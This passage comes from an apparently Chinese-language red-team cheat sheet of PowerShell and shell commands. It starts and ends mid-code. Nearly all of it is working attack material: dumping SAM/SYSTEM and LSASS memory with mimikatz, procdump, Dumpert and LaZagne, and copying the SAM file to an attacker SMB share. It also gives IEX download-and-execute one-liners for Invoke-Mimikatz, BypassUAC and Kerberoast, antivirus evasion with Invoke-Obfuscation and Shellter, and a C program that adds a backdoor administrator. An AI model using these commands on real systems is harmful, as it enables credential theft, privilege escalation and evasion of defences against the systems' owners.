class="hljs-type">System.Convert</span>]::ToBase64String(<span class="hljs-variable">$fe</span>)<br></code></pre></td></tr></table></figure>

<ul>
<li>解密安全密码 ( <code>SecureString</code>)</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| From SecureString.xml</span><br><span class="hljs-variable">$file</span> = <span class="hljs-built_in">Import-CliXml</span> <span class="hljs-literal">-Path</span> string.xml<br><span class="hljs-variable">$file</span>.GetNetworkCredential().Password<br><span class="hljs-variable">$file</span>.GetNetworkCredential().Flag<br><br><span class="hljs-comment">## ------------------| </span><br><span class="hljs-variable">$pw</span> = <span class="hljs-built_in">gc</span> admin<span class="hljs-literal">-pass</span>.xml | <span class="hljs-built_in">ConvertTo-SecureString</span><br><span class="hljs-variable">$cred</span> = <span class="hljs-built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="hljs-string">&quot;Administrator&quot;</span>, <span class="hljs-variable">$pw</span>)<br><span class="hljs-variable">$cred</span>.GetNetworkCredential() | <span class="hljs-built_in">fl</span> * <br><br><span class="hljs-comment">## ------------------| </span><br><span class="hljs-variable">$user</span> = <span class="hljs-string">&quot;USERNAME&quot;</span><br><span class="hljs-variable">$pass</span> = <span class="hljs-string">&quot;PASSWORD&quot;</span> <br><span class="hljs-variable">$secStringPass</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-variable">$pass</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span><br><span class="hljs-variable">$cred</span> = <span class="hljs-built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="hljs-variable">$user</span>,<span class="hljs-variable">$secStringPass</span>)<br><span class="hljs-variable">$cred</span> | <span class="hljs-built_in">fl</span><br><span class="hljs-variable">$cred</span>.GetNetworkCredential() | <span class="hljs-built_in">fl</span>     <br></code></pre></td></tr></table></figure>

<h3 id="01-12-转储凭证"><a href="#01-12-转储凭证" class="headerlink" title="01.12 转储凭证"></a>01.12 转储凭证</h3><ul>
<li>转储<code>SAM</code>和<code>SYSTEM</code>文件</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell">REG SAVE HKLM\SYSTEM SYSTEM<br>REG SAVE HKLM\SAM SAM<br><br><span class="hljs-comment"># Get hashes</span><br>impacket<span class="hljs-literal">-secretsdump</span> <span class="hljs-literal">-sam</span> SAM <span class="hljs-literal">-system</span> SYSTEM local<br><br>impacket<span class="hljs-literal">-secretsdump</span> <span class="hljs-literal">-sam</span> SAM <span class="hljs-literal">-system</span> SYSTEM <span class="hljs-literal">-history</span> local <br></code></pre></td></tr></table></figure>

<ul>
<li>使用<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1">Out-Minidump.ps1</a></li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">wget</span> https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/<span class="hljs-built_in">Out-Minidump</span>.ps1<br><span class="hljs-built_in">IEX</span>(<span class="hljs-built_in">New-Object</span> Net.Webclient).DownloadString(<span class="hljs-string">&#x27;http://&lt;IP&gt;/Out-Minidump.ps1&#x27;</span>)<br><span class="hljs-built_in">Get-Process</span> lsass | <span class="hljs-built_in">out-minidump</span><br></code></pre></td></tr></table></figure>

<ul>
<li>使用<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">过程转储</a></li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Get PID</span><br>tasklist | findstr /i lsas<br><br><span class="hljs-comment">## ------------------| Dump to file</span><br>procdump64.exe <span class="hljs-literal">-accepteula</span> <span class="hljs-literal">-ma</span> &lt;PID&gt; lsass.dmp<br>procdump64.exe <span class="hljs-literal">-accepteula</span> <span class="hljs-literal">-ma</span> lsass.exe lsass.dmp<br><br><span class="hljs-comment">## ------------------| Extract hashes</span><br>pypykatz lsa minidump lsass.dmp<br>mimikatz.exe <span class="hljs-string">&quot;sekurlsa::minidump c:\lsass.dmp&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonpasswords&quot;</span><br></code></pre></td></tr></table></figure>

<ul>
<li>与<a target="_blank" rel="noopener" href="https://github.com/outflanknl/Dumpert">Dumpert</a></li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">wget</span> https://github.com/h4rithd/PrecompiledBinaries/raw/main/Dumpert/Outflank<span class="hljs-literal">-Dumpert</span>.dll<br><span class="hljs-built_in">wget</span> https://github.com/h4rithd/PrecompiledBinaries/raw/main/Dumpert/Outflank<span class="hljs-literal">-Dumpert</span>.exe<br><br>.\Outflank<span class="hljs-literal">-Dumpert</span>.exe<br>rundll32.exe C:\Windows\temp\Outflank<span class="hljs-literal">-Dumpert</span>.dll,Dump<br></code></pre></td></tr></table></figure>

<ul>
<li>使用 Avast 的<a target="_blank" rel="noopener" href="https://github.com/f1tz/Misc/tree/master/AvDump">AvDump</a></li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Location</span><br>C:\Program Files\Avast Software\Avast\AvDump.exe<br><br><span class="hljs-comment">## ------------------| Download </span><br><span class="hljs-built_in">wget</span> <span class="hljs-literal">-O</span> ADTool.exe https://github.com/f1tz/Misc/raw/master/AvDump/x86/AvDump.exe<br><span class="hljs-built_in">wget</span> <span class="hljs-literal">-O</span> ADTool.exe https://github.com/f1tz/Misc/raw/master/AvDump/x64/AvDump.exe<br><br><span class="hljs-comment">## ------------------| Execute</span><br>.\AvDump.exe <span class="hljs-literal">--pid</span> <span class="hljs-number">704</span> <span class="hljs-literal">--exception_ptr</span> <span class="hljs-number">0</span> <span class="hljs-literal">--thread_id</span> <span class="hljs-number">0</span> <span class="hljs-literal">--dump_level</span> <span class="hljs-number">1</span> <span class="hljs-literal">--dump_file</span> C:\Windows\temp\file.dmp<br><br><span class="hljs-comment">## ------------------| Metasploit post exploitation module </span><br>post/windows/gather/avast_memory_dump<br></code></pre></td></tr></table></figure>

<ul>
<li>使用<a target="_blank" rel="noopener" href="https://github.com/f1tz/Misc/tree/master/SqlDumper">SqlDumper</a></li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Download </span><br><span class="hljs-built_in">wget</span> https://github.com/f1tz/Misc/raw/master/SqlDumper/SqlDumper_2008R2_x86.zip<br><span class="hljs-built_in">wget</span> https://github.com/f1tz/Misc/raw/master/SqlDumper/SqlDumper_2008R2_x64.zip<br><br><span class="hljs-comment">## ------------------| Execute</span><br>.\sqldumper.exe [<span class="hljs-type">lsass</span><span class="hljs-string">&#x27;s pid] 0 0x0110</span><br><span class="hljs-string"></span><br><span class="hljs-string">## ------------------| Extract passwords</span><br><span class="hljs-string">mimikatz.exe &quot;log&quot; &quot;sekurlsa::minidump SQLDmpr0001.mdmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit</span><br></code></pre></td></tr></table></figure>

<ul>
<li>laZagne.exe [火狐、Chrome]</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">wget</span> https://github.com/AlessandroZ/LaZagne/releases/download/v2.<span class="hljs-number">4.5</span>/LaZagne.exe<br>.\laZagne.exe all<br></code></pre></td></tr></table></figure>

<h3 id="01-13-其他"><a href="#01-13-其他" class="headerlink" title="01.13 其他"></a>01.13 其他</h3><ul>
<li><code>smb</code>从服务器复制文件</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Start SMB Server</span><br>impacket<span class="hljs-literal">-smbserver</span> &lt;shareName&gt; &lt;sharePath&gt;<br>impacket<span class="hljs-literal">-smbserver</span> share <span class="hljs-variable">$</span>(<span class="hljs-built_in">pwd</span>) <span class="hljs-literal">-smb2support</span><br>impacket<span class="hljs-literal">-smbserver</span> share <span class="hljs-variable">$</span>(<span class="hljs-built_in">pwd</span>) <span class="hljs-literal">-smb2support</span> <span class="hljs-literal">-username</span> h4rithd <span class="hljs-literal">-password</span> Password123      <br><br><span class="hljs-comment">## ------------------| 使用cmd装载共享</span><br>net use z: &lt;MyIP&gt;\share<br>net use z: \\&lt;MyIP&gt;\share /USER:h4rithd Password123<br><br><span class="hljs-comment">## ------------------| 使用powershell装载共享</span><br><span class="hljs-variable">$pass</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">&#x27;Password123&#x27;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span><br><span class="hljs-variable">$cred</span> = <span class="hljs-built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="hljs-string">&#x27;h4rithd&#x27;</span>, <span class="hljs-variable">$pass</span>)<br><span class="hljs-built_in">New-PSDrive</span> <span class="hljs-literal">-Name</span> h4rithd <span class="hljs-literal">-PSProvider</span> FileSystem <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$cred</span> <span class="hljs-literal">-Root</span> \\&lt;MyIP&gt;\share<br><span class="hljs-built_in">cd</span> h4rithd:<br><span class="hljs-built_in">dir</span><br><br><span class="hljs-comment">## ------------------| Direct copy</span><br><span class="hljs-built_in">copy</span> C:\Users\Public\sam \\<span class="hljs-number">10.10</span>.<span class="hljs-number">14.26</span>\share\sam<br>xcopy C:\Users\Public\sam \\<span class="hljs-number">10.10</span>.<span class="hljs-number">14.26</span>\share\sam<br></code></pre></td></tr></table></figure>

<ul>
<li>在 Linux 上启动<code>SMB</code>samba 服务器以共享文件。</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| From using Impacket-smbserver </span><br>impacket<span class="hljs-literal">-smbserver</span> share .<br><span class="hljs-comment"># 如果出现错误“您的系统需要SMB2或更高版本”，则运行以下命令</span><br>impacket<span class="hljs-literal">-smbserver</span> share . <span class="hljs-literal">-smb2support</span> <br><br><span class="hljs-comment">## ------------------| From using Linux default SMBA</span><br><span class="hljs-comment">## Backup current settings </span><br>sudo <span class="hljs-built_in">cp</span> /etc/samba/smb.conf /etc/samba/smb.conf.bak<br><span class="hljs-comment">## 为smb位置创建目录并授予权限</span><br>mkdir <span class="hljs-literal">-p</span> /tmp/smb<br>chmod <span class="hljs-number">0777</span> /tmp/smb<br><span class="hljs-comment">## Config smba for share</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;\n\n#### --- <span class="hljs-variable">$</span>(hostname) was edits below lines ----\n</span><br><span class="hljs-string">[share] \n \</span><br><span class="hljs-string">\tpath = /tmp/smb \n \</span><br><span class="hljs-string">\tpublic = yes \n \</span><br><span class="hljs-string">\twritable = yes \n \</span><br><span class="hljs-string">\tcomment = <span class="hljs-variable">$</span>(hostname) shares \n \</span><br><span class="hljs-string">\tprintable = no \n \</span><br><span class="hljs-string">\tguest ok = yes \n \</span><br><span class="hljs-string">#### --- Edit done -------&quot;</span> &gt;&gt; /etc/samba/smb.conf<br><span class="hljs-comment">## Verify configs</span><br>tail <span class="hljs-number">10</span> /etc/samba/smb.conf<br><span class="hljs-comment">## Start smb service</span><br>sudo service smbd restart<br><br><span class="hljs-comment">## ** 请注意，完成后恢复设置！！！</span><br><span class="hljs-built_in">cp</span> /etc/samba/smb.conf.bak /etc/samba/smb.conf<br>service smbd restart<br></code></pre></td></tr></table></figure>

<ul>
<li><a target="_blank" rel="noopener" href="https://gist.github.com/m8r0wn/b6654989035af20a1cb777b61fbc29bf">红队备忘单</a></li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| 以其他用户身份运行Powershell提示符，不将配置文件加载到计算机[替换DOMAIN和user]</span><br>runas /user:DOMAIN\USER /noprofile powershell.exe<br><br><span class="hljs-comment">## ------------------| 插入注册表项以在较新版本的Windows上启用Wdigest</span><br>reg add HKLM\SYSTEM\CurrentControlSet\Contro\SecurityProviders\Wdigest /v UseLogonCredential /t Reg_DWORD /d <span class="hljs-number">1</span><br><br><span class="hljs-comment">## ------------------| 调用BypassUAC并以管理员身份启动PowerShell提示符[或替换以运行任何其他命令]</span><br>powershell.exe <span class="hljs-literal">-exec</span> bypass <span class="hljs-literal">-C</span> <span class="hljs-string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-BypassUAC.ps1&#x27;);Invoke-BypassUAC -Command &#x27;start powershell.exe&#x27;&quot;</span><br><br><span class="hljs-comment">## ------------------| Invoke-Mimikatz：从内存转储凭据</span><br>powershell.exe <span class="hljs-literal">-exec</span> bypass <span class="hljs-literal">-C</span> <span class="hljs-string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1&#x27;);Invoke-Mimikatz -DumpCreds&quot;</span><br><br><span class="hljs-comment">## ------------------| 导入Mimikatz模块以运行进一步的命令</span><br>powershell.exe <span class="hljs-literal">-exec</span> Bypass <span class="hljs-literal">-noexit</span> <span class="hljs-literal">-C</span> <span class="hljs-string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1&#x27;)&quot;</span><br><br><span class="hljs-comment">## ------------------| 调用MassMimikatz：用于在远程主机上转储凭据[将$env:computername替换为目标服务器名称]</span><br>powershell.exe <span class="hljs-literal">-exec</span> Bypass <span class="hljs-literal">-C</span> <span class="hljs-string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PewPewPew/Invoke-MassMimikatz.ps1&#x27;);&#x27;<span class="hljs-variable">$env:COMPUTERNAME</span>&#x27;|Invoke-MassMimikatz -Verbose&quot;</span><br><br><span class="hljs-comment">## ------------------| 通电：权限提升检查</span><br>powershell.exe <span class="hljs-literal">-exec</span> Bypass <span class="hljs-literal">-C</span> “<span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1’);<span class="hljs-built_in">Invoke-AllChecks</span>”<br><br><span class="hljs-comment">## ------------------| 调用Inveigh并将输出记录到文件</span><br>powershell.exe <span class="hljs-literal">-exec</span> Bypass <span class="hljs-literal">-C</span> <span class="hljs-string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Scripts/Inveigh.ps1&#x27;);Invoke-Inveigh -ConsoleOutput Y –NBNS Y –mDNS Y  –Proxy Y -LogOutput Y -FileOutput Y&quot;</span>         <br><br><span class="hljs-comment">## ------------------| 调用Kerberoast并提供与Hashcat兼容的哈希</span><br>powershell.exe <span class="hljs-literal">-exec</span> Bypass <span class="hljs-literal">-C</span> <span class="hljs-string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1&#x27;);Invoke-kerberoast -OutputFormat Hashcat&quot;</span><br><br><span class="hljs-comment">## ------------------| 调用ShareFinder并将输出打印到文件</span><br>powershell.exe <span class="hljs-literal">-exec</span> Bypass <span class="hljs-literal">-C</span> <span class="hljs-string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1&#x27;);Invoke-ShareFinder -CheckShareAccess|Out-File -FilePath sharefinder.txt&quot;</span><br><br><span class="hljs-comment">## ------------------| 导入PowerView模块以运行更多命令</span><br>powershell.exe <span class="hljs-literal">-exec</span> Bypass <span class="hljs-literal">-noexit</span> <span class="hljs-literal">-C</span> <span class="hljs-string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1&#x27;)&quot;</span><br><br><span class="hljs-comment">## ------------------| Invoke-Bloodhound</span><br>powershell.exe <span class="hljs-literal">-exec</span> Bypass <span class="hljs-literal">-C</span> <span class="hljs-string">&quot;IEX(New-Object Net.Webclient).DownloadString(&#x27;https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1&#x27;);Invoke-BloodHound&quot;</span><br></code></pre></td></tr></table></figure>

<h2 id="02-防御规避技术"><a href="#02-防御规避技术" class="headerlink" title="02.防御规避技术"></a>02.防御规避技术</h2><ul>
<li>AV 规避技术（调用混淆）</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Basic setup</span><br>git clone https://github.com/danielbohannon/<span class="hljs-built_in">Invoke-Obfuscation</span><br><span class="hljs-built_in">cd</span> <span class="hljs-built_in">Invoke-Obfuscation</span><br>pwsh<br><span class="hljs-built_in">Import-Module</span> ./<span class="hljs-built_in">Invoke-Obfuscation</span>.psd1<br><span class="hljs-built_in">cd</span> /tmp<br><span class="hljs-built_in">Invoke-Obfuscation</span><br><br><span class="hljs-comment">## ------------------| 通过编码混淆整个命令</span><br><span class="hljs-built_in">SET</span> SCRIPTPATH /tmp/revshell.ps1<br>ENCODING<br><span class="hljs-number">5</span><br>OUT /tmp/enc.ps1<br><br><span class="hljs-comment">## ------------------| 混淆PowerShell Ast节点（PS3.0+）</span><br><span class="hljs-built_in">SET</span> SCRIPTPATH /tmp/revshell.ps1<br>AST<br>ALL<br><span class="hljs-number">1</span><br>OUT /tmp/enc.ps1<br></code></pre></td></tr></table></figure>

<ul>
<li>使用Shellter进行躲避</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">shellter<br>A <span class="hljs-comment">### For automatic mode</span><br><span class="hljs-comment">### you can do it your self. </span><br></code></pre></td></tr></table></figure>

<h2 id="03-脚本"><a href="#03-脚本" class="headerlink" title="03.脚本"></a>03.脚本</h2><ul>
<li>使用 c 添加新用户</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">#include &lt;stdlib.h&gt;</span><br><br>int main ()<br>&#123;<br>    int user;<br>    user = system (<span class="hljs-string">&quot;net user h4rithd Password! /add&quot;</span>);<br>    user = system (<span class="hljs-string">&quot;net localgroup administrators h4rithd /add&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">## sudo i686-w64-mingw32-gcc adduser.c -o adduser.exe</span><br></code></pre></td></tr></table></figure>

<ul>
<li>获取ServiceACL.ps1</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># download Get-ServiceACL.ps1 to the box and execute in memory</span><br><span class="hljs-variable">$h</span>=<span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-ComObject</span> Msxml2.XMLHTTP;<span class="hljs-variable">$h</span>.open(<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;http://10.10.14.2/GetServiceACL.ps1&#x27;</span>,<span class="hljs-variable">$false</span>);<span class="hljs-variable">$h</span>.send();<span class="hljs-built_in">iex</span> <span class="hljs-variable">$h</span>.responseText<br><br><span class="hljs-comment"># examine nscp service ACL</span><br><span class="hljs-string">&quot;nscp&quot;</span> | <span class="hljs-built_in">Get-ServiceAcl</span> | <span class="hljs-built_in">select</span> <span class="hljs-literal">-ExpandProperty</span> Access<br></code></pre></td></tr></table></figure>

<ul>
<li>调用-TSPingSweep.ps1</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">wget</span> https://raw.githubusercontent.com/dwj7738/My<span class="hljs-literal">-Powershell-Repository</span>/master/Scripts/<span class="hljs-built_in">Invoke-TSPingSweep</span>.ps1<br><br><span class="hljs-built_in">IEX</span>(<span class="hljs-built_in">New-Object</span> Net.WebClient).downloadString(<span class="hljs-string">&#x27;http://10.8.0.74/Invoke-TSPingSweep.ps1&#x27;</span>)<br><span class="hljs-built_in">Invoke-TSPingSweep</span> <span class="hljs-literal">-StartAddress</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">0.1</span> <span class="hljs-literal">-EndAddress</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">0.254</span> <span class="hljs-literal">-ResolveHost</span> <span class="hljs-literal">-ScanPort</span><br></code></pre></td></tr></table></figure>

<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Invoke-Portscan.ps1">Invoke-Portscan.ps1</a></li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Scan port 22</span><br><span class="hljs-built_in">Invoke-Portscan</span> <span class="hljs-literal">-Hosts</span> <span class="hljs-number">172.16</span>.<span class="hljs-number">249.1</span>/<span class="hljs-number">24</span> <span class="hljs-literal">-Ports</span> <span class="hljs-number">22</span> <span class="hljs-literal">-Threads</span> <span class="hljs-number">30</span> | <span class="hljs-built_in">Where</span> &#123; <span class="hljs-variable">$_</span>.Alive <span class="hljs-operator">-eq</span> <span class="hljs-string">&quot;True&quot;</span> &#125;   <br><br><span class="hljs-comment">## ------------------| Scan other ports</span><br><span class="hljs-built_in">Invoke-Portscan</span> <span class="hljs-literal">-Hosts</span> <span class="hljs-number">172.16</span>.<span class="hljs-number">249.202</span> <span class="hljs-literal">-Ports</span> <span class="hljs-string">&#x27;21,22,80,443,8080&#x27;</span><br></code></pre></td></tr></table></figure>

<ul>
<li><a target="_blank" rel="noopener" href="https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions/Invoke-AESEncryption.ps1">Invoke-AESEncryption.ps1</a></li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Import-Module</span><br><span class="hljs-built_in">Import-Module</span> .\<span class="hljs-built_in">Invoke-AESEncryption</span>.ps1<br><br><span class="hljs-comment">## ------------------| Encrypt </span><br><span class="hljs-built_in">Invoke-AESEncryption</span>.ps1 <span class="hljs-literal">-Mode</span> Encrypt <span class="hljs-literal">-Key</span> <span class="hljs-string">&quot;h4rithd&quot;</span> <span class="hljs-literal">-Path</span> .\PlanText.txt<br><br><span class="hljs-comment">## ------------------| Decrypt </span><br><span class="hljs-built_in">Invoke-AESEncryption</span> <span class="hljs-literal">-Mode</span> Decrypt <span class="hljs-literal">-Key</span> <span class="hljs-string">&quot;h4rithd&quot;</span> <span class="hljs-literal">-Path</span> .\ciphertext.txt.aes<br></code></pre></td></tr></table></figure>

<ul>
<li>用于下载文件的<a target="_blank" rel="noopener" href="https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl/373068">wget脚本。</a></li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Create wget.js file</span><br>var WinHttpReq = new ActiveXObject(<span class="hljs-string">&quot;WinHttp.WinHttpRequest.5.1&quot;</span>);<br>WinHttpReq.Open(<span class="hljs-string">&quot;GET&quot;</span>, WScript.Arguments(<span class="hljs-number">0</span>), /*async=*/false);<br>WinHttpReq.Send();<br>BinStream = new ActiveXObject(<span class="hljs-string">&quot;ADODB.Stream&quot;</span>);<br>BinStream.Type = <span class="hljs-number">1</span>;<br>BinStream.Open();<br>BinStream.Write(WinHttpReq.ResponseBody);<br>BinStream.SaveToFile(WScript.Arguments(<span class="hljs-number">1</span>));<br><br><span class="hljs-comment">## ------------------| It can be executed as follows.</span><br>cscript /nologo wget.js http://<span class="hljs-number">10.10</span>.<span class="hljs-number">14.25</span>/nc.exe 